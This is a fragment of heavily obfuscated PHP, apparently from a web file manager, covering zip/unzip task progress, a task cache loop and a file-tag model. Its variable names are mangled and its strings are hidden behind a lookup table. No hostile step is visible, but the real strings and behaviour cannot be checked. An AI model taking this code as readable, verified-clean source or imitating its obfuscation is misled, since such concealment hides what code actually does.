$ÊµõÎ„È, $·ÎæƒÆ©[1897] => $ÂÉØ¥´Î, $·ÎæƒÆ©[1908] => $¤øòĞùÇ); if (is_array($ŠóÜÃ·ı[$Ş¨¶¢´Ş])) { if (timeFloat() - $ŠóÜÃ·ı[$Ş¨¶¢´Ş][$·ÎæƒÆ©[1906]] <= $ëˆôÒÆ[$·ÎæƒÆ©[1908]] * 0.5) { return; } $ëˆôÒÆ[$·ÎæƒÆ©[1907]] = $ŠóÜÃ·ı[$Ş¨¶¢´Ş][$·ÎæƒÆ©[1907]]; } $ŠóÜÃ·ı[$Ş¨¶¢´Ş] = $ëˆôÒÆ; Cache::set($««õØãã, $ŠóÜÃ·ı, 60); Cache::removeMemory($««õØãã); write_log($·ÎæƒÆ©[1909] . $Ş¨¶¢´Ş . $·ÎæƒÆ©[74] . $ÊµõÎ„È . $·ÎæƒÆ©[1910] . ACTION, $·ÎæƒÆ©[198]); } public static function timeLimitCallLoop() { $ƒ¡Û’ş =& $_SERVER[ùèÅ´Ãš]; $È¸ìÃ‹ñ = array($ƒ¡Û’ş[1911]); $¿©İœ±» = in_array(strtolower(ACTION), $È¸ìÃ‹ñ); if (!$¿©İœ±» && !self::$asyncAdd) { return; } $ÄòÂè—™ = $ƒ¡Û’ş[1905]; $µş¶¶à¢ = Cache::get($ÄòÂè—™, !0); if (!$µş¶¶à¢ || count($µş¶¶à¢) <= 0) { return; } $ÕŞîàİÚ = timeFloat(); $ßô•ºîÜ = array(); $èÁÚíŸù = array(); foreach ($µş¶¶à¢ as $‚ÂĞÙŸ => $ıõ™«ƒ‚) { if ($ÕŞîàİÚ - $ıõ™«ƒ‚[$ƒ¡Û’ş[1907]] > $ıõ™«ƒ‚[$ƒ¡Û’ş[1908]]) { $èÁÚíŸù[$‚ÂĞÙŸ] = $ıõ™«ƒ‚; continue; } $ßô•ºîÜ[$‚ÂĞÙŸ] = $ıõ™«ƒ‚; } if (count($èÁÚíŸù) == 0) { return; } if (count($ßô•ºîÜ) == 0) { Cache::remove($ÄòÂè—™); } else { Cache::set($ÄòÂè—™, $ßô•ºîÜ, 60); } Cache::removeMemory($ÄòÂè—™); self::runArr($èÁÚíŸù); } public static function finished($—…©ñæ›, $Šø¡âëÔ) { $íÈËüÌú =& $_SERVER[ùèÅ´Ãš]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($íÈËüÌú[344] => $—…©ñæ›, $íÈËüÌú[1897] => $Šø¡âëÔ); } private static function runArr($ÕË„î’ò) { $Ãè‡ÚÃö =& $_SERVER[ùèÅ´Ãš]; if (!$ÕË„î’ò) { return; } foreach ($ÕË„î’ò as $÷¨×½•Õ => $¶Õ™ô) { try { Hook::apply($¶Õ™ô[$Ãè‡ÚÃö[344]], $¶Õ™ô[$Ãè‡ÚÃö[1897]]); write_log($Ãè‡ÚÃö[1912] . $÷¨×½•Õ . $Ãè‡ÚÃö[74] . $¶Õ™ô[$Ãè‡ÚÃö[344]] . $Ãè‡ÚÃö[1910] . ACTION, $Ãè‡ÚÃö[198]); } catch (Exception $ôÖÎ¡˜ú) { } } } public static function autoRun() { self::runArr(self::$syncTask); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $˜û÷ƒßÄ =& $_SERVER[ùèÅ´Ãš]; parent::startAfter(); Hook::bind($˜û÷ƒßÄ[1913], array($this, $˜û÷ƒßÄ[1914])); Hook::bind($˜û÷ƒßÄ[1292], array($this, $˜û÷ƒßÄ[1915])); Hook::bind($˜û÷ƒßÄ[1916], array($this, $˜û÷ƒßÄ[1917])); $ÈŒ¥¥´Ÿ =& $this->task; $ÈŒ¥¥´Ÿ[$˜û÷ƒßÄ[1918]] = $˜û÷ƒßÄ[1293]; if (!$ÈŒ¥¥´Ÿ[$˜û÷ƒßÄ[1683]]) { $ÈŒ¥¥´Ÿ[$˜û÷ƒßÄ[1683]] = LNG($˜û÷ƒßÄ[1919]); } } protected function endAfter() { $ğœ—­»Ï =& $_SERVER[ùèÅ´Ãš]; parent::endAfter(); Hook::unbind($ğœ—­»Ï[1913], array($this, $ğœ—­»Ï[1914])); Hook::unbind($ğœ—­»Ï[1292], array($this, $ğœ—­»Ï[1915])); Hook::unbind($ğœ—­»Ï[1916], array($this, $ğœ—­»Ï[1917])); } public function updateAfter() { $µ½¥‘‰ì =& $_SERVER[ùèÅ´Ãš]; $çÊı‡•Ó =& $this->task; if (!$çÊı‡•Ó[$µ½¥‘‰ì[1151]] || !$çÊı‡•Ó[$µ½¥‘‰ì[841]]) { if ($çÊı‡•Ó[$µ½¥‘‰ì[1918]] != $µ½¥‘‰ì[390]) { return; } } if ($çÊı‡•Ó[$µ½¥‘‰ì[1918]] == $µ½¥‘‰ì[1293]) { $ö™±Õ™ = 0; if ($çÊı‡•Ó[$µ½¥‘‰ì[1851]]) { $ö™±Õ™ = $çÊı‡•Ó[$µ½¥‘‰ì[1852]] / $çÊı‡•Ó[$µ½¥‘‰ì[1851]]; } $çÊı‡•Ó[$µ½¥‘‰ì[1799]] = $ö™±Õ™ * 0.3; } else { if ($çÊı‡•Ó[$µ½¥‘‰ì[1918]] == $µ½¥‘‰ì[390]) { $ö™±Õ™ = $çÊı‡•Ó[$µ½¥‘‰ì[1798]] / $çÊı‡•Ó[$µ½¥‘‰ì[1151]]; $çÊı‡•Ó[$µ½¥‘‰ì[1799]] = 0.3 + $ö™±Õ™ * 0.4; } else { if ($çÊı‡•Ó[$µ½¥‘‰ì[1918]] == $µ½¥‘‰ì[110]) { $ò›’—²› = 0; if ($çÊı‡•Ó[$µ½¥‘‰ì[1853]] == $µ½¥‘‰ì[110]) { $ò›’—²› = $çÊı‡•Ó[$µ½¥‘‰ì[1852]]; } $ö™±Õ™ = ($çÊı‡•Ó[$µ½¥‘‰ì[1856]] + $ò›’—²›) / $çÊı‡•Ó[$µ½¥‘‰ì[841]]; $çÊı‡•Ó[$µ½¥‘‰ì[1799]] = 0.3 + 0.4 + $ö™±Õ™ * 0.3; } } } if ($çÊı‡•Ó[$µ½¥‘‰ì[1799]] > 0) { $¢Ç¯½¸ = timeFloat() - $çÊı‡•Ó[$µ½¥‘‰ì[1801]] - $çÊı‡•Ó[$µ½¥‘‰ì[1804]]; $çÊı‡•Ó[$µ½¥‘‰ì[1805]] = $¢Ç¯½¸ * (1 - $çÊı‡•Ó[$µ½¥‘‰ì[1799]]) / $çÊı‡•Ó[$µ½¥‘‰ì[1799]]; } } public function addFile($ ã–­ïí) { $öÏµ­˜Å =& $_SERVER[ùèÅ´Ãš]; $úş®ã® =& $this->task; $øò ÑÊı = IO::info($ ã–­ïí); $úş®ã®[$öÏµ­˜Å[1849]] = $øò ÑÊı[$öÏµ­˜Å[32]]; $úş®ã®[$öÏµ­˜Å[1851]] = $øò ÑÊı[$öÏµ­˜Å[79]]; $úş®ã®[$öÏµ­˜Å[1852]] = 0; $úş®ã®[$öÏµ­˜Å[1153]] = $öÏµ­˜Å[1872]; $úş®ã®[$öÏµ­˜Å[1853]] = $öÏµ­˜Å[1293]; $úş®ã®[$öÏµ­˜Å[841]] = $øò ÑÊı[$öÏµ­˜Å[79]]; $úş®ã®[$öÏµ­˜Å[1151]] = 1; $ñïÅ˜Êù = 0; $úş®ã®[$öÏµ­˜Å[1860]] = array($öÏµ­˜Å[1861] => $ñïÅ˜Êù + 1, $öÏµ­˜Å[496] => $øò ÑÊı[$öÏµ­˜Å[32]], $öÏµ­˜Å[87] => $øò ÑÊı[$öÏµ­˜Å[87]], $öÏµ­˜Å[586] => $øò ÑÊı[$öÏµ­˜Å[586]] ? $øò ÑÊı[$öÏµ­˜Å[586]] : $øò ÑÊı[$öÏµ­˜Å[87]]); $this->update(); } public function zipEvent($Ãê‘·´ë, $²ÉÀé’¤, $£ã–¡şì, $ğô´ë…) { $¯±µ„ñ‹ =& $_SERVER[ùèÅ´Ãš]; $òıÂ›Œë =& $this->task; $òıÂ›Œë[$¯±µ„ñ‹[1849]] = get_path_this($²ÉÀé’¤); $òıÂ›Œë[$¯±µ„ñ‹[1851]] = $ğô´ë…; $òıÂ›Œë[$¯±µ„ñ‹[1852]] = $£ã–¡şì; $òıÂ›Œë[$¯±µ„ñ‹[1153]] = $Ãê‘·´ë == $¯±µ„ñ‹[1920] ? $¯±µ„ñ‹[1921] : $¯±µ„ñ‹[1922]; $òıÂ›Œë[$¯±µ„ñ‹[1853]] = $¯±µ„ñ‹[12]; $òıÂ›Œë[$¯±µ„ñ‹[841]] = $ğô´ë…; $òıÂ›Œë[$¯±µ„ñ‹[1918]] = $¯±µ„ñ‹[390]; $this->update(); } public function unzipAfter($æï¨ù¡½) { $­ø—ç«ò =& $_SERVER[ùèÅ´Ãš]; $×ŠìÍÄ‚ =& $this->task; $×ŠìÍÄ‚[$­ø—ç«ò[1918]] = $­ø—ç«ò[110]; $Ÿ”«Ç¸ = IO::infoWithChildren($æï¨ù¡½); $óâŸ¿Ä = 0; $×ŠìÍÄ‚[$­ø—ç«ò[1860]] = array($­ø—ç«ò[1861] => $óâŸ¿Ä + 1, $­ø—ç«ò[496] => $Ÿ”«Ç¸[$­ø—ç«ò[32]], $­ø—ç«ò[87] => $Ÿ”«Ç¸[$­ø—ç«ò[87]], $­ø—ç«ò[586] => $Ÿ”«Ç¸[$­ø—ç«ò[586]] ? $Ÿ”«Ç¸[$­ø—ç«ò[586]] : $Ÿ”«Ç¸[$­ø—ç«ò[87]]); if ($Ÿ”«Ç¸[$­ø—ç«ò[33]] == $­ø—ç«ò[233]) { $×ŠìÍÄ‚[$­ø—ç«ò[1151]] = 1; } else { $×ŠìÍÄ‚[$­ø—ç«ò[1151]] = $Ÿ”«Ç¸[$­ø—ç«ò[82]][$­ø—ç«ò[80]]; } $×ŠìÍÄ‚[$­ø—ç«ò[1153]] = $­ø—ç«ò[12]; $×ŠìÍÄ‚[$­ø—ç«ò[1853]] = 0; $×ŠìÍÄ‚[$­ø—ç«ò[1798]] = 0; $×ŠìÍÄ‚[$­ø—ç«ò[1851]] = 0; $×ŠìÍÄ‚[$­ø—ç«ò[1852]] = 0; $×ŠìÍÄ‚[$­ø—ç«ò[1849]] = $­ø—ç«ò[12]; $×ŠìÍÄ‚[$­ø—ç«ò[1856]] = 0; $×ŠìÍÄ‚[$­ø—ç«ò[841]] = $Ÿ”«Ç¸[$­ø—ç«ò[79]]; $this->update(); self::log($­ø—ç«ò[1923] . json_encode(array($×ŠìÍÄ‚, $Ÿ”«Ç¸))); } public function nameParse($ˆæ¢¤×Ø) { $èÌÃğÌˆ =& $_SERVER[ùèÅ´Ãš]; $Ê÷’šÙ‰ =& $this->task; if ($Ê÷’šÙ‰[$èÌÃğÌˆ[1918]] == $èÌÃğÌˆ[1293]) { $Ê÷’šÙ‰[$èÌÃğÌˆ[1918]] = $èÌÃğÌˆ[390]; $Ê÷’šÙ‰[$èÌÃğÌˆ[1856]] = 0; $Ê÷’šÙ‰[$èÌÃğÌˆ[841]] = 0; } $íĞãÃ¸ = get_path_this($ˆæ¢¤×Ø); if (strstr($íĞãÃ¸, $èÌÃğÌˆ[10])) { $Ê÷’šÙ‰[$èÌÃğÌˆ[1798]] += 1; $Ê÷’šÙ‰[$èÌÃğÌˆ[1151]] += 1; } $Ê÷’šÙ‰[$èÌÃğÌˆ[1849]] = $ˆæ¢¤×Ø; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $¿êÁ˜¹ã =& $_SERVER[ùèÅ´Ãš]; parent::startAfter(); Hook::bind($¿êÁ˜¹ã[1924], array($this, $¿êÁ˜¹ã[1914])); Hook::bind($¿êÁ˜¹ã[1916], array($this, $¿êÁ˜¹ã[1917])); $Ç¯¯²ô­ =& $this->task; $Ç¯¯²ô­[$¿êÁ˜¹ã[1918]] = $¿êÁ˜¹ã[1293]; if (!$Ç¯¯²ô­[$¿êÁ˜¹ã[1683]]) { $Ç¯¯²ô­[$¿êÁ˜¹ã[1683]] = LNG($¿êÁ˜¹ã[1925]); } } protected function endAfter() { $¨ºÛƒ²¶ =& $_SERVER[ùèÅ´Ãš]; parent::endAfter(); Hook::unbind($¨ºÛƒ²¶[1924], array($this, $¨ºÛƒ²¶[1914])); Hook::unbind($¨ºÛƒ²¶[1916], array($this, $¨ºÛƒ²¶[1917])); } public function updateAfter() { $ğŠœğÅŠ =& $_SERVER[ùèÅ´Ãš]; $¤Èİ =& $this->task; if (!$¤Èİ[$ğŠœğÅŠ[1151]] || !$¤Èİ[$ğŠœğÅŠ[841]]) { return; } if ($¤Èİ[$ğŠœğÅŠ[1918]] == $ğŠœğÅŠ[1293]) { $‚’ùà± = $¤Èİ[$ğŠœğÅŠ[1852]]; if ($¤Èİ[$ğŠœğÅŠ[1853]] != $ğŠœğÅŠ[1293]) { $‚’ùà± = 0; } $¸Ï¬‚„ = ($¤Èİ[$ğŠœğÅŠ[1856]] + $‚’ùà±) / $¤Èİ[$ğŠœğÅŠ[841]]; $¤Èİ[$ğŠœğÅŠ[1799]] = $¸Ï¬‚„ * 0.3; } else { if ($¤Èİ[$ğŠœğÅŠ[1918]] == $ğŠœğÅŠ[390]) { $¸Ï¬‚„ = $¤Èİ[$ğŠœğÅŠ[1798]] / $¤Èİ[$ğŠœğÅŠ[1151]]; $¤Èİ[$ğŠœğÅŠ[1799]] = 0.3 + $¸Ï¬‚„ * 0.5; } else { if ($¤Èİ[$ğŠœğÅŠ[1918]] == $ğŠœğÅŠ[110]) { $¸Ï¬‚„ = 0; if ($¤Èİ[$ğŠœğÅŠ[1851]]) { $¸Ï¬‚„ = $¤Èİ[$ğŠœğÅŠ[1852]] / $¤Èİ[$ğŠœğÅŠ[1851]]; } $¤Èİ[$ğŠœğÅŠ[1799]] = 0.3 + 0.5 + $¸Ï¬‚„ * 0.2; } } } if ($¤Èİ[$ğŠœğÅŠ[1799]] > 0) { $ç²œû„Î = timeFloat() - $¤Èİ[$ğŠœğÅŠ[1801]] - $¤Èİ[$ğŠœğÅŠ[1804]]; $¤Èİ[$ğŠœğÅŠ[1805]] = $ç²œû„Î * (1 - $¤Èİ[$ğŠœğÅŠ[1799]]) / $¤Èİ[$ğŠœğÅŠ[1799]]; } } public function copyFileStart($»Å³õ§³, $‡î×İŞ«, $®ˆí¼²Ô, $°èÜ™¸, $ŒÙÁÛ¤‹, $¦¶Ã©²€) { $âÓóş» =& $_SERVER[ùèÅ´Ãš]; parent::copyFileStart($»Å³õ§³, $‡î×İŞ«, $®ˆí¼²Ô, $°èÜ™¸, $ŒÙÁÛ¤‹, $¦¶Ã©²€); $†®©¸„› =& $this->task; if ($†®©¸„›[$âÓóş»[1918]] == $âÓóş»[390]) { $†®©¸„›[$âÓóş»[1918]] = $âÓóş»[110]; } $this->update(); } public function copyFileEnd($Ê•ã–Ÿï, $Ú¿¥¥õû, $±îÕÂÊò, $çËÉ‡ìğ, $ƒÁŠùÆ, $©¹ãâ¶) { $¦òÇŸÈİ =& $_SERVER[ùèÅ´Ãš]; $‘Œ¿ûãÔ =& $this->task; $‘Œ¿ûãÔ[$¦òÇŸÈİ[1852]] = $‘Œ¿ûãÔ[$¦òÇŸÈİ[1851]]; $‘Œ¿ûãÔ[$¦òÇŸÈİ[1856]] += $‘Œ¿ûãÔ[$¦òÇŸÈİ[1851]]; $‘Œ¿ûãÔ[$¦òÇŸÈİ[1853]] = $¦òÇŸÈİ[12]; $this->update(); } public function zipEvent($½ºØË¥˜, $¯çšœï‰, $éé§¶”°, $ëû¾¯†) { $ˆ…œİ¥ò =& $_SERVER[ùèÅ´Ãš]; $Ş©Ú¹Ò =& $this->task; $Ş©Ú¹Ò[$ˆ…œİ¥ò[1849]] = get_path_this($¯çšœï‰); $Ş©Ú¹Ò[$ˆ…œİ¥ò[1851]] = $ëû¾¯†; $Ş©Ú¹Ò[$ˆ…œİ¥ò[1852]] = $éé§¶”°; $Ş©Ú¹Ò[$ˆ…œİ¥ò[1153]] = $½ºØË¥˜ == $ˆ…œİ¥ò[1926] ? $ˆ…œİ¥ò[1921] : $ˆ…œİ¥ò[1922]; $Ş©Ú¹Ò[$ˆ…œİ¥ò[1853]] = $ˆ…œİ¥ò[12]; $Ş©Ú¹Ò[$ˆ…œİ¥ò[841]] = $ëû¾¯†; $Ş©Ú¹Ò[$ˆ…œİ¥ò[1918]] = $ˆ…œİ¥ò[390]; $this->update(); } public function nameParse($üÄøïä©) { $¦ïÁ²°ğ =& $_SERVER[ùèÅ´Ãš]; $ìÎìØØ =& $this->task; if ($ìÎìØØ[$¦ïÁ²°ğ[1798]] < $ìÎìØØ[$¦ïÁ²°ğ[1151]]) { $Á¹İÖüç = get_path_this($üÄøïä©); if (strstr($Á¹İÖüç, $¦ïÁ²°ğ[10])) { $ìÎìØØ[$¦ïÁ²°ğ[1798]] += 1; } } if ($ìÎìØØ[$¦ïÁ²°ğ[1918]] == $¦ïÁ²°ğ[1293]) { $ìÎìØØ[$¦ïÁ²°ğ[1918]] = $¦ïÁ²°ğ[390]; } $ìÎìØØ[$¦ïÁ²°ğ[1849]] = $üÄøïä©; $this->update(); } } goto eöÔº±ëøå; C¸›¶’³Ç‰: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\x72\x5f\146\x61\166"; protected function cacheFunctionAlias($„ÆºÓµ˜) { $Ğ‡¸Òùı =& $_SERVER[ùèÅ´Ãš]; return array($Ğ‡¸Òùı[2113] => array($Ğ‡¸Òùı[2547] . USER_ID, $Ğ‡¸Òùı[2114])); } protected function listData() { $”‹ÀÎÊÑ =& $_SERVER[ùèÅ´Ãš]; $¾ûĞç±“ = array($”‹ÀÎÊÑ[1788] => USER_ID, $”‹ÀÎÊÑ[561] => array($”‹ÀÎÊÑ[2117], 0)); $°¤ÙÇó = $”‹ÀÎÊÑ[2548]; $’º„Ä»² = $this->field($°¤ÙÇó)->where($¾ûĞç±“)->order($”‹ÀÎÊÑ[2119])->select(); return $’º„Ä»² ? $’º„Ä»² : array(); } protected function addToTag($Çí’²¥, $®á‚ş¡š) { $ä˜÷şõ =& $_SERVER[ùèÅ´Ãš]; if (!Model($ä˜÷şõ[2270])->listData($®á‚ş¡š)) { return !1; } if (is_numeric($Çí’²¥)) { $äº˜Â¼‹ = Model($ä˜÷şõ[908])->pathInfo($Çí’²¥); if (!$äº˜Â¼‹) { return !1; } } else { $äº˜Â¼‹ = IO::infoSimple($Çí’²¥); if (!$äº˜Â¼‹) { return !1; } $œ©‚¤¥ = $äº˜Â¼‹[$ä˜÷şõ[32]]; $¡üÊ¦·Ğ = $äº˜Â¼‹[$ä˜÷şõ[33]]; if (isset($äº˜Â¼‹[$ä˜÷şõ[487]])) { $¡üÊ¦·Ğ = $äº˜Â¼‹[$ä˜÷şõ[487]] == $ä˜÷şõ[91] ? $ä˜÷şõ[78] : $ä˜÷şõ[233]; } } $üæ Á = array($ä˜÷şõ[1788] => USER_ID, $ä˜÷şõ[561] => $®á‚ş¡š, $ä˜÷şõ[497] => $Çí’²¥, $ä˜÷şõ[498] => $¡üÊ¦·Ğ ? $¡üÊ¦·Ğ : $ä˜÷şõ[492], $ä˜÷şõ[496] => $œ©‚¤¥ ? $œ©‚¤¥ : $ä˜÷şõ[12], $ä˜÷şõ[2001] => 0); if ($this->where($üæ Á)->find()) { return !1; } return $this->add($üæ Á); } protected function removeFromTag($êãïŞ™â, $½ñİó) { $­½âùê =& $_SERVER[ùèÅ´Ãš]; if (!Model($­½âùê[2270])->listData($½ñİó)) { return !1; } if (is_array($êãïŞ™â)) { $êãïŞ™â = array($­½âùê[7], $êãïŞ™â); } $¿…»°ïø = array($­½âùê[1788] => USER_ID, $­½âùê[561] => $½ñİó, $­½âùê[497] => $êãïŞ™â); return $this->where($¿…»°ïø)->delete(); } protected function removeByTag($Àú´Â²) { $»õÖÂ«Š =& $_SERVER[ùèÅ´Ãš]; if (!$Àú´Â²) { return !1; } $µìõù¾ = array($»õÖÂ«Š[1788] => USER_ID, $»õÖÂ«Š[561] => $Àú´Â²); return $this->where($µìõù¾)->delete(); } protected function removeBySource($äˆıá‘) { $™£ùÆœ‹ =& $_SERVER[ùèÅ´Ãš]; if (is_array($äˆıá‘)) { $äˆıá‘ = array($™£ùÆœ‹[7], $äˆıá‘); } $×¦½¯á£ = array($™£ùÆœ‹[1788] => USER_ID, $™£ùÆœ‹[561] => array($™£ùÆœ‹[1102], 0), $™£ùÆœ‹[497] => $äˆıá‘); return $this->where($×¦½¯á£)->delete(); } }